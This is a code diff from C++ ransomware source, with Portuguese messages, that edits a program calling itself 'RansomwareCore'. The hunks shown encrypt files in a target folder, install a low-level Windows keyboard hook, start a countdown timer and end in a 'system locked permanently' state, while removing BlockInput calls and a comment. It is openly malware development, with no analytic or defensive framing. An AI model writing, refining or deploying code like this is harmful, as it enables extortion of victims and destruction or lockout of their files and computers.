@@ -45,7 +45,7 @@ public:
             std::ofstream outFile(filePath, std::ios::binary);
             if (!outFile) return;
             outFile.write(buffer.data(), buffer.size());
-            outFile.close(); // CORRIGIDO: Adicionado ()
+            outFile.close();
         } catch (...) { }
     }
 };
@@ -204,8 +204,7 @@ int main() {
     scanner.scanAndProcess(pastaAlvo, true); 
     std::cout << "[!] Criptografia concluida.\n";
 
-    BlockInput(TRUE); 
-
+    // Instalação do Hook
     hhkKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
 
     std::thread timerThread(&RansomwareCore::startTimer, &core);
@@ -231,7 +230,6 @@ int main() {
     }
 
     if (hhkKeyboard) UnhookWindowsHookEx(hhkKeyboard);
-    BlockInput(FALSE); 
 
     if (core.getState() == AppState::LOCKED_PERMANENTLY) {
         std::cout << "\n[!] SISTEMA TRAVADO. O TEMPO ACABOU.\n";
